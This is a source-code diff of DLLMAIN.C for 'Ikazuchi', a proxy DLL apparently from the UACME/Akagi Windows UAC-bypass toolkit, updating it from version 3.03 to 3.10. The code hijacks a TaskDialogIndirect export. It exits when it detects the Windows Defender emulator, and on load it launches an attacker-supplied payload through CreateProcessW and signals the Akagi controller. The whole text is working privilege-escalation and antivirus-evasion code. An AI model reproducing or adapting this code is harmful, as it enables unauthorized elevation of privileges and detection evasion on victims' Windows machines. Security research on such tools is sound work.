@@ -4,9 +4,9 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.03
+*  VERSION:     3.10
 *
-*  DATE:        11 Oct 2018
+*  DATE:        18 Nov 2018
 *
 *  Proxy dll entry point, Ikazuchi.
 *
@@ -21,20 +21,7 @@
 #error ANSI build is not supported
 #endif
 
-//disable nonmeaningful warnings.
-#pragma warning(push)
-#pragma warning(disable: 4005 4201)
-
-#include <windows.h>
-#include "shared\ntos.h"
-#include <ntstatus.h>
-#include "shared\minirtl.h"
-#include "shared\_filename.h"
-#include "shared\util.h"
-#include "shared\windefend.h"
-
-#pragma warning(pop)
-
+#include "shared\shared.h"
 #include "shared\libinc.h"
 
 #define LoadedMsg      TEXT("Ikazuchi lock and loaded")
@@ -54,6 +41,9 @@ typedef HRESULT(WINAPI *pfnTaskDialogIndirect)(
     int  *pnRadioButton,
     BOOL *pfVerificationFlagChecked
     );
+
+UACME_PARAM_BLOCK g_SharedParams;
+
 
 /*
 * DummyFunc
@@ -105,7 +95,7 @@ HRESULT WINAPI TaskDialogIndirectForward(
         
         if (!NT_SUCCESS(NtAllocateVirtualMemory(
             NtCurrentProcess(),
-            &lpszFullDllPath,
+            (PVOID*)&lpszFullDllPath,
             0,
             &sz,
             MEM_COMMIT | MEM_RESERVE,
@@ -134,7 +124,7 @@ HRESULT WINAPI TaskDialogIndirectForward(
 
         if (!NT_SUCCESS(NtAllocateVirtualMemory(
             NtCurrentProcess(), 
-            &lpSxsPath, 
+            (PVOID*)&lpSxsPath, 
             0, 
             &sz, 
             MEM_COMMIT | MEM_RESERVE, 
@@ -166,12 +156,12 @@ HRESULT WINAPI TaskDialogIndirectForward(
 
     if (lpszFullDllPath) {
         sz = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
+        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&lpszFullDllPath, &sz, MEM_RELEASE);
     }
 
     if (lpSxsPath) {
         sz = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
+        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&lpSxsPath, &sz, MEM_RELEASE);
     }
 
     return hr;
@@ -191,41 +181,45 @@ BOOL WINAPI DllMain(
     _In_ LPVOID lpvReserved
 )
 {
-    BOOL bReadSuccess, bIsLocalSystem = FALSE;
-    PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
+    BOOL bSharedParamsReadOk;
+    PWSTR lpParameter;
+    ULONG cbParameter;
 
-    UNREFERENCED_PARAMETER(hinstDLL);
     UNREFERENCED_PARAMETER(lpvReserved);
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
         ExitProcess('foff');
 
+    LdrDisableThreadCalloutsForDll(hinstDLL);
+
     if (fdwReason == DLL_PROCESS_ATTACH) {
 
         OutputDebugString(LoadedMsg);
 
-        ucmIsLocalSystem(&bIsLocalSystem);
-
-        bReadSuccess = ucmReadParameters(
-            &lpParameter,
-            &cbParameter,
-            NULL,
-            NULL,
-            bIsLocalSystem);
+        //
+        // Read shared params block.
+        //
+        RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+        bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+        if (bSharedParamsReadOk) {
+            lpParameter = g_SharedParams.szParameter;
+            cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+        }
+        else {
+            lpParameter = NULL;
+            cbParameter = 0UL;
+        }
 
         ucmLaunchPayloadEx(
             CreateProcessW,
             lpParameter,
             cbParameter);
 
-        if ((bReadSuccess) &&
-            (lpParameter != NULL))
-        {
-            RtlFreeHeap(
-                NtCurrentPeb()->ProcessHeap,
-                0,
-                lpParameter);
+        //
+        // Notify Akagi.
+        //
+        if (bSharedParamsReadOk) {
+            ucmSetCompletion(g_SharedParams.szSignalObject);
         }
 
     }
